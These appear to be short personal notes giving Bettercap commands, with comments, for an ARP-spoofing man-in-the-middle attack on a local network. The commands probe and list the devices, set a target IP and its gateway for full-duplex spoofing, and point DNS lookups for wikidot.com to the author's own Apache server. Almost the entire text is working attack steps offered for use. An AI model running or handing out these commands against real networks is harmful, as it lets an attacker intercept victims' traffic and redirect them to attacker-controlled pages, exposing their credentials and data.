#Bettercap for Kali Linux (not natively installed and must be run with sudo privelages) 
sudo bettercap

#Probe the network to see a list of devices connected
net.probe on

#Lists all devices on network with MAC address and IP address
net.show

#Tells the program to target not only the IP address but also the gateway that its connected to so that you can see traffic going both ways
set arp.spoof.fullduplex true

#Arp spoofing your target IP address
set arp.spoof.targets <ip address>

#Setting up DNS spoof so that when the target connects to "wikidot.com" it redirects the traffic to my Kali Linux apache server.
set dns.spoof.domains wikidot.com

#Launch attack 
arp.spoof on
